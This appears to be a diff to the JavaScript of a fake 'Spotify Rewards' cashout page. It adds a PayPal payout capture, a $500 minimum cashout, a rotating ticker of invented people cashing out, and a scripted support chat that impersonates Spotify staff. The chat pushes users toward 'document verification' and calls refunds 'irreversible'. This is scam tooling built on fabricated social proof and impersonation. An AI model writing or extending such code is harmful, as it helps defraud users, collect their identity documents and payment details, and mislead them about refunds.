@@ -1806,7 +1806,141 @@
       var wb = document.getElementById('withdrawBalance');
       if (wb) wb.textContent = fmt(balance);
       var mh = document.getElementById('maxHint');
-      if (mh) mh.textContent = 'Max available: $' + fmt(balance);
+      if (mh) mh.textContent = balance >= 500 ? 'Full balance available for clearance' : 'Minimum cashout: $500.00';
+      var wa = document.getElementById('withdrawAmount');
+      if (wa) wa.value = '$' + fmt(balance);
+      var tx = document.getElementById('txEarned');
+      if (tx) tx.textContent = '$' + fmt(balance) + ' USD';
+    }
+
+    // ── PAYOUT DESTINATION UI ─────────────────────────────────────────
+    function spGetPayout() { try { return JSON.parse(localStorage.getItem('sp_payout') || 'null'); } catch (e) { return null; } }
+    function spRenderPayoutUI() {
+      var p = spGetPayout();
+      var no = document.getElementById('noBankWrap');
+      var yes = document.getElementById('linkedBankWrap');
+      if (!no || !yes) return;
+      if (p && p.email) {
+        no.style.display = 'none';
+        yes.style.display = 'flex';
+        var n = document.getElementById('linkedBankName');
+        if (n) n.textContent = 'PayPal · ' + p.email;
+      } else {
+        no.style.display = '';
+        yes.style.display = 'none';
+      }
+    }
+    function requestWithdrawalRef() {
+      var p = spGetPayout();
+      var em = document.getElementById('paypalEmail');
+      if (em && em.value.trim() && (!p || !p.email)) {
+        localStorage.setItem('sp_payout', JSON.stringify({ email: em.value.trim() }));
+        spRenderPayoutUI();
+      }
+      if (typeof submitWithdraw === 'function') submitWithdraw(new Event('submit'));
+    }
+
+    // ── SOCIAL PROOF TICKER ───────────────────────────────────────────
+    var SP_TICKER = [
+      'Michael R. (Austin, TX) cashed out $840.20 via PayPal',
+      'Sofia M. (Miami, FL) cashed out $512.00 via PayPal',
+      'James K. (Denver, CO) cashed out $1,240.75 via PayPal',
+      'Ana L. (Phoenix, AZ) cashed out $655.30 via PayPal',
+      'Daniel P. (Chicago, IL) cashed out $973.10 via PayPal'
+    ];
+    setInterval(function () {
+      var t = document.getElementById('tickerText');
+      if (!t) return;
+      t.style.opacity = '0';
+      setTimeout(function () {
+        t.textContent = SP_TICKER[Math.floor(Math.random() * SP_TICKER.length)];
+        t.style.opacity = '1';
+      }, 300);
+    }, 5000);
+
+    // ── INLINE SUPPORT CHAT ───────────────────────────────────────────
+    var scStarted = false;
+    function scBubble(html, who) {
+      var box = document.getElementById('scMessages');
+      if (!box) return null;
+      var row = document.createElement('div');
+      row.className = 'chat-msg-row ' + (who === 'me' ? 'outgoing' : 'incoming');
+      row.innerHTML = who === 'me'
+        ? '<div class="chat-msg-bubble outgoing">' + html + '</div>'
+        : '<div class="sp-chat-avatar-sm">S</div><div class="chat-msg-bubble incoming">' + html + '</div>';
+      box.appendChild(row);
+      box.scrollTop = box.scrollHeight;
+      return row;
+    }
+    function scTyping(cb, delay) {
+      var box = document.getElementById('scMessages');
+      if (!box) return;
+      var row = document.createElement('div');
+      row.className = 'chat-msg-row incoming';
+      row.innerHTML = '<div class="sp-chat-avatar-sm">S</div><div class="chat-msg-bubble incoming typing-msg-box"><span class="typing-bubble-dot"></span><span class="typing-bubble-dot"></span><span class="typing-bubble-dot"></span></div>';
+      box.appendChild(row);
+      box.scrollTop = box.scrollHeight;
+      setTimeout(function () { row.remove(); cb(); }, delay || 1200);
+    }
+    function scPresets() {
+      var box = document.getElementById('scMessages');
+      if (!box) return;
+      var m = document.createElement('div');
+      m.className = 'support-preset-menu';
+      m.innerHTML = [
+        ['status', 'Check my withdrawal status'],
+        ['timing', 'How long does the payout take?'],
+        ['docs', 'Document verification help'],
+        ['refund', 'Request a refund / chargeback']
+      ].map(function (o) { return '<button class="preset-option-btn" onclick="scPreset(\'' + o[0] + '\',this)">' + o[1] + '</button>'; }).join('');
+      box.appendChild(m);
+      box.scrollTop = box.scrollHeight;
+    }
+    function scPreset(key, el) {
+      var label = el ? el.textContent : key;
+      if (el && el.parentNode) el.parentNode.remove();
+      scBubble(label, 'me');
+      if (key === 'refund') {
+        scTyping(function () {
+          scBubble('I understand. A refund is handled by our financial department and is <strong>irreversible</strong>. I will open the request form for you now.', 'them');
+          setTimeout(function () {
+            var s = document.getElementById('spComplaintReason') || document.getElementById('cmpReason');
+            if (s) { try { s.value = 'Refund'; } catch (e) {} }
+            if (typeof openComplaintModal === 'function') openComplaintModal();
+          }, 900);
+        }, 1400);
+        return;
+      }
+      var answers = {
+        status: 'Your withdrawal is in the compliance queue. You can follow every stage on the <strong>Cashout</strong> tab tracker — it updates automatically as our analysts review your documents.',
+        timing: 'After document approval, PayPal transfers are released within 1–3 business days. The compliance review itself usually takes a few days depending on queue volume.',
+        docs: 'Make sure the document photos are sharp, uncropped, and match the name on your account. If a file is rejected you can re-upload it from the Cashout tab.'
+      };
+      scTyping(function () {
+        scBubble(answers[key] || 'Thanks, our team will review this and get back to you.', 'them');
+        setTimeout(scPresets, 700);
+      }, 1500);
+    }
+    function scInit() {
+      if (scStarted) return;
+      scStarted = true;
+      scTyping(function () {
+        scBubble('Hi! You are talking with the Spotify Rewards support team. How can we help you today?', 'them');
+        setTimeout(scPresets, 600);
+      }, 900);
+    }
+    function scKey(e) { if (e.key === 'Enter') scSend(); }
+    function scSend() {
+      var i = document.getElementById('scInput');
+      if (!i || !i.value.trim()) return;
+      var txt = i.value.trim();
+      i.value = '';
+      scBubble(txt.replace(/</g, '&lt;'), 'me');
+      if (typeof window.spLogTicket === 'function') { try { window.spLogTicket({ subject: 'Live chat', message: txt }); } catch (e) {} }
+      scTyping(function () {
+        scBubble('Thanks for the details. I registered your message in our system — an agent will follow up here and by email shortly.', 'them');
+        setTimeout(scPresets, 800);
+      }, 1600);
     }
 
     // ── TABS ───────────────────────────────────────────────────────────
